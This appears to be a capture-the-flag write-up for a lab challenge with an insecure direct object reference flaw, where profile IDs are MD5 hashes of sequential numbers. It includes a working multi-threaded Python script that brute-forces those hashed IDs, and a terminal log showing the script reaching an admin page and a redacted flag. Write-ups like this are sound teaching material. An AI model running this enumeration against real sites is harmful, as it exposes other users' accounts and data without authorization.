@@ -1,0 +1,64 @@
+Basic IDOR vulnerability and the /profile/user/id the id part is md5 hash so for guest user the id is 3000 as said and the md5 hash of that matches /id part. 
+
+So we write a basic brute forcing script as follows and get the flag:
+
+import requests
+import hashlib
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+base_url = input("Enter base url (e.g. http://...): ").strip()
+
+def check_id(i):
+    num_str = str(i)
+    md5_hash = hashlib.md5(num_str.encode('utf-8')).hexdigest()
+    url = f"{base_url}/profile/user/{md5_hash}"
+    try:
+        r = requests.get(url, timeout=5)
+        if r.status_code == 200:
+            # Check if it's NOT the guest page or contains admin/flag
+            if "Guest" not in r.text or "picoCTF" in r.text or "admin" in r.text.lower():
+                return i, url, r.text
+    except Exception:
+        pass
+    return None
+
+def main():
+    print("[*] Launching multi-threaded scan from 0 to 10000...")
+    
+    # 50 concurrent threads to max out speed without overwhelming the server
+    max_workers = 50
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {executor.submit(check_id, i): i for i in range(10001)}
+        
+        checked = 0
+        for future in as_completed(futures):
+            checked += 1
+            if checked % 500 == 0:
+                print(f"[-] Checked {checked}/10001 IDs...", end="\r")
+                
+            result = future.result()
+            if result:
+                i, url, content = result
+                print(f"\n\n[+] SUCCESS! FOUND NON-GUEST ID {i}!")
+                print(f"URL: {url}")
+                print(f"Response:\n{content}\n")
+                return
+
+    print("\n[*] Scan complete.")
+
+if __name__ == "__main__":
+    main()
+
+Results:
+
+┌─[✗]─[ff02x9e@parrot]─[~/ctf-challs/picoCTF/temp]
+└──╼ $python3 brute_force_script.py
+Enter base url (e.g. http://...): http://chatelaine.cylabacademy.net:26884
+[*] Launching multi-threaded scan from 0 to 10000...
+[-] Checked 3000/10001 IDs...
+
+[+] SUCCESS! FOUND NON-GUEST ID 3010!
+URL: http://chatelaine.cylabacademy.net:26884/profile/user/{redacted}
+Response:
+Welcome, admin! Here is the flag: academy{redacted}
